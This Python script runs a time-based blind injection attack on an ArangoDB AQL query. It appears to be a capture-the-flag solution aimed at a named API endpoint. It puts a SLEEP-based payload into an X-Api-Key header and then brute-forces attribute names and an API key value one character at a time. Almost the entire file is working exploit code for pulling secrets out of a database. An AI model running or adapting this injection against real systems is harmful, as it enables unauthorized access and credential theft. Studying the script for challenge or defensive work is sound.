# AQL (AragonDB Query Language) Time-Based Blind Injection
# Python script to hit a vulnerable query parameter that allows a pause
# to be included if the AQL query is successful.

import requests
import sys
import time

# Send payload to a vulnerable parameter on an API
# If it takes a pre-define number of seconds or longer to get a reply -> true response
def send_payload(payload: str) -> bool:
    n_secs = 2  # set to whatever value you want
    base_url = "https://api.frostbit.app/api/v1/frostbitadmin/bot"
    # bot_uuid = "09c4dbcb-87dd-4d92-b104-852c60a94f3e"
    bot_uuid = "ab241332-81ea-436b-8ab5-cf0d003274de"
    url = f"{base_url}/{bot_uuid}/deactivate"
    headers = {
        "X-Api-Key": f"'OR {payload} AND SLEEP({n_secs}) OR'"
    }
    params = {
        "debug": "1"
    }
    start = time.time()
    # print(url,headers,params)
    response = requests.get(url, headers=headers, params=params)
    # print(response.text)
    end = time.time()
    if end-start >= n_secs:
        return True
    else:
        return False

# Brute force the length of an object based on the given query
def brute_length(query: str) -> int:
    length = 0
    for i in range(0,100):
        payload = f"{query} {i}"
        if send_payload(payload):
            length = i
            break
    return length

# Brute force the name of an object based on the given query
# The name_length is the length of the name to find
# The query is expected to have a placeholder '|pos|' to use the positional index in the loop
# The ascii_charset flag is used to decide whether to use the full ASCII range of printable characters
# or a smaller range of just letters and numbers
# The show_progress flag is used to optionally show the characters as they are found
def brute_name(query: str, name_length: int, ascii_charset: bool = True, show_progress: bool = True) -> str:
    # Initialize name
    name = ""
    
    # Define the character set range
    # (adjust as needed for the desired character set)
    if ascii_charset:
        # ASCII range for printable characters
        charset_range = range(32, 127)
    else:
        # a-z, A-Z, 0-9
        charset_range = range(96, 123)

    # Brute force the name with the given query    
    if show_progress:
        sys.stdout.write("name: ")
        sys.stdout.flush()
    for i in range(0, name_length):
        # Replace |pos| placeholder with index i
        query_with_i = query.replace('|pos|', str(i))
        for char_code in charset_range:
            # Check if char(char_code) is a valid letter in position i in the name
            payload = f"{query_with_i} '{chr(char_code)}'"
            if send_payload(payload):
                name += chr(char_code)
                if show_progress:
                    sys.stdout.write(chr(char_code))
                    sys.stdout.flush()
                break
    if show_progress:
        sys.stdout.write("\n")
        sys.stdout.flush()

    return name


# Brute-force the number of attribute keys of a document
# Determine the length of the name of each attribute
# Iterate through all possible characters and brute-force the name of each attribute
# Determine the length of the value of each attribute
# Iterate through all possible characters and brute-force the value of each attribute
def main():
    # 1. Number of attributes in the view
    # Omit all system attributes (starting with an underscore, such as _key and _id)
    n_attributes = brute_length('LENGTH(ATTRIBUTES(doc,true)) ==')
    print(f'number of attributes in view = {n_attributes}')

    # 2. Length of attribute name
    attr_name_length = brute_length('LENGTH(ATTRIBUTES(doc,true)[0]) ==')
    print(f'length of attribute name = {attr_name_length}')

    # 3. Attribute name
    attr_name = brute_name('SUBSTRING(ATTRIBUTES(doc,true)[0],|pos|,1) == ', attr_name_length)
    print(f'attribute name: {attr_name}')

    # 4. Length of value of attribute
    attr_value_length = brute_length(f'LENGTH(doc.{attr_name}) ==')
    print(f'length of attribute value = {attr_value_length}')

    # 5. Value of attribute
    attr_value = brute_name(f'SUBSTRING(doc.{attr_name},|pos|,1) ==', attr_value_length)
    print(f'API Key attribute value = {attr_value}')

if __name__ == "__main__":
    main()

